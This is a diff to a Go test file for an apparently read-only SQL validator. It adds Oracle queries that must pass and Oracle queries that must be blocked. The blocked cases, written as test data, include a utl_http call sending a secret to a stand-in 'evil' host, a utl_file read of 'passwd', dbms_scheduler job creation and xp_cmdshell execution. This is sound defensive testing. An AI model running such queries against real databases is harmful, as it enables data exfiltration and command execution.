@@ -50,6 +50,11 @@ func TestNoFalsePositivesOnEnterpriseSchema(t *testing.T) {
 		{"window fn", "SELECT Id, ROW_NUMBER() OVER (ORDER BY CreatedAt DESC) rn FROM dbo.Orders"},
 		{"string literal with keyword", "SELECT * FROM dbo.Audit WHERE Action = 'delete'"},
 		{"trailing semicolon", "SELECT 1;"},
+		// Oracle reads that look scary but are ordinary.
+		{"oracle dual", "SELECT SYSDATE FROM dual"},
+		{"dbms_random", "SELECT * FROM (SELECT * FROM employees ORDER BY dbms_random.value) WHERE ROWNUM <= 5"},
+		{"dbms_lob read", "SELECT id, dbms_lob.getlength(doc_blob) FROM documents"},
+		{"utl-ish column", "SELECT util_score, sutl_flag FROM metrics"},
 	}
 	for _, c := range ok {
 		if err := Validate(c.sql); err != nil {
@@ -67,6 +72,10 @@ func TestStillBlocksWrites(t *testing.T) {
 		{"writing cte", "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d"},
 		{"xp_cmdshell", "SELECT * FROM dbo.T WHERE 1=1; EXEC xp_cmdshell 'dir'"},
 		{"openrowset", "SELECT * FROM OPENROWSET('SQLNCLI','','SELECT 1')"},
+		// Oracle escape hatches inside a plain SELECT.
+		{"utl_http", "SELECT utl_http.request('http://evil/' || secret) FROM vault"},
+		{"utl_file", "SELECT utl_file.fgetattr('DIR','passwd') FROM dual"},
+		{"dbms_scheduler", "SELECT dbms_scheduler.create_job('j','PLSQL_BLOCK','x') FROM dual"},
 	}
 	for _, c := range bad {
 		if err := Validate(c.sql); err == nil {
